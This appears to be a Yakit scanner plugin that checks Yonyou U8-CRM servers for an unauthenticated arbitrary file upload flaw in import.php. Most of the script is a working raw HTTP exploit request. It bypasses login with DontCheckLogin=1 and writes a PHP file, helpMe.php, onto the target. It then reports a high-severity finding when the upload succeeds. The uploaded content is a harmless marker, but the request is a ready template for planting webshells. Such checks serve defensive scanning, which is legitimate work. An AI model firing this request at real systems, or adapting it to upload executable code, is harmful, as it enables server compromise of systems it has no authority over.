script_name: 用友U8-CRM import任意文件上传漏洞
content:
# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1 HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Length: 277
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5
Upgrade-Insecure-Requests: 1

------WebKitFormBoundarye0z8QbHs79gL8vW5
Content-Disposition: form-data; name="xfile"; filename="11.xls"

f.0.f
------WebKitFormBoundarye0z8QbHs79gL8vW5
Content-Disposition: form-data; name="combo"

helpMe.php
------WebKitFormBoundarye0z8QbHs79gL8vW5--`

    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    if str.MatchAllOfSubString(rsp, `HTTP/1.1 200`) && str.MatchAllOfSubString(rsp, `success`){
        yakit.Info("%v found 用友U8-CRM import任意文件上传漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("用友U8-CRM import任意文件上传漏洞"),
        risk.severity("high"),
        risk.titleVerbose("用友U8-CRM import任意文件上传漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
		risk.details(addr + "/tmpfile/helpMe.php"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
